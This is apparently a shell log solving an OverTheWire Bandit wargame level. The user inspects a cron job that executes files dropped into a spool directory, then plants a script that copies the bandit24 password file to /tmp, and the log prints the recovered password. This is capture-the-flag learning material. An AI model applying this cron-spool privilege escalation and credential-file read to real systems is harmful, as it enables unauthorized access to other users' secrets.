```bash
bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done


bandit23@bandit:/etc/cron.d$ mkdir /tmp/bernardotest
bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/bernardotest
bandit23@bandit:/etc/cron.d$ ls -la /tmp/bernardotest
total 305924
drwxrwxrwx 2 bandit23 root      4096 Apr 17 21:47 .
drwxrws-wt 1 root     root 313204736 Apr 17 21:48 ..
bandit23@bandit:/etc/cron.d$ ls
atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
bandit23@bandit:/etc/cron.d$ ls
atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
bandit23@bandit:/etc/cron.d$ cd /var/spool/
bandit24/ cron/     mail/     rsyslog/
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/
bandit23@bandit:/var/spool/bandit24$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24$ echo "cat /etc/bandit_pass/bandit24 > /tmp/bernardotest/totallynotthepass.txt" > script.sh
bandit23@bandit:/var/spool/bandit24$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/bernardotest/totallynotthepass.txt
bandit23@bandit:/var/spool/bandit24$
bandit23@bandit:/var/spool/bandit24$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/bernardotest/totallynotthepass.txt
bandit23@bandit:/var/spool/bandit24$ cat /tmp/bernardotest/totallynotthepass.txt
cat: /tmp/bernardotest/totallynotthepass.txt: No such file or directory
bandit23@bandit:/var/spool/bandit24$ echo "cat /etc/bandit_pass/bandit24 > /tmp/bernardotest/totallynotthepass.txt" > script.sh
bandit23@bandit:/var/spool/bandit24$ chmod 777 script.sh
bandit23@bandit:/var/spool/bandit24$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/bernardotest/totallynotthepass.txt
bandit23@bandit:/var/spool/bandit24$ cat script.sh
cat: script.sh: No such file or directory
bandit23@bandit:/var/spool/bandit24$ cat /tmp/bernardotest/totallynotthepass.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```